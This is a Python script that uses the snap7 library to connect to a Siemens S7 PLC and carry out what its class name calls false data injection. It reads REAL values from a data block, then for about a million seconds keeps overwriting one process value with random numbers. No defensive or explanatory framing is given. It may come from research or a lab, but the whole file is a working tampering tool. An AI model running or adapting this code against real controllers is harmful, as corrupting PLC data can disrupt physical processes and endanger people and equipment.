import snap7
from snap7.exceptions import Snap7Exception
import time
import os
import csv
import pandas as pd
import datetime
import snap7
import random

class PLCFalseDataInjection:
    def __init__(self, ip_address, plc_number, db_number, start_offset, bit_offset):
        self.ip_address = ip_address
        self.plc_number = plc_number
        self.client = self.connect_plc()
        self.start_offset = start_offset
        self.bit_offset = bit_offset

    def connect_plc(self):
        client = snap7.client.Client()
        try:
            client.connect(self.ip_address, 0, 1, 102)
            return client
        except Snap7Exception as e:
            return None
    def read_variables(self, db_number, num_items):
        data_values = {}
        data = self.client.db_read(2, 0, 4)

        data2 = self.client.db_read(2, 4, 4)
        value1 = snap7.util.get_real(data, 0)
        value2 = snap7.util.get_real(data2, 0)

        return value1,value2

    @staticmethod
    def generate_random_values_with_duration(duration):
        start_time = time.time()
        end_time = start_time + duration
        random_values = []

        while time.time() < end_time:
            random_values.append(random.randint(0, 100))
            

        return random_values

    def writeValue(self, db_number, start_offset, bit_offset, value, duration):
        try:
            start_time = time.time()
            end_time = start_time + duration

            while time.time() < end_time:
                reading = self.client.db_read(db_number, start_offset, 4)  
                random_number = random.choice(PLCFalseDataInjection.generate_random_values_with_duration(1))
                real_value = float(random_number) 
                packed_real = snap7.util.get_real(reading, 0)
                snap7.util.set_real(reading, 0, real_value)  
                self.client.db_write(db_number, start_offset, reading) 
                print(
                    f"DB number :{db_number} / Offset number {self.start_offset}.{self.bit_offset}: \n Before :{packed_real} Now:{real_value} \n-----Successfully changed------------")


        except Snap7Exception as e:
            print(f"Error writing Data Block {db_number}, Offset {start_offset}: {str(e)}")
            return False 

ip_address = '192.168.0.1';
plc_number = 1;
db_number = 2;
start_offset = 4;
bit_offset = 0;
num_items = 2
value = 12
duration = 1000000 
plc_data_get = PLCFalseDataInjection(ip_address, plc_number, db_number, start_offset, bit_offset)


try:

    data_values = plc_data_get.read_variables(db_number, num_items)
    data_change = plc_data_get.writeValue(db_number, start_offset, bit_offset, value,duration)

except KeyboardInterrupt:
    plc_data_get.close_connection()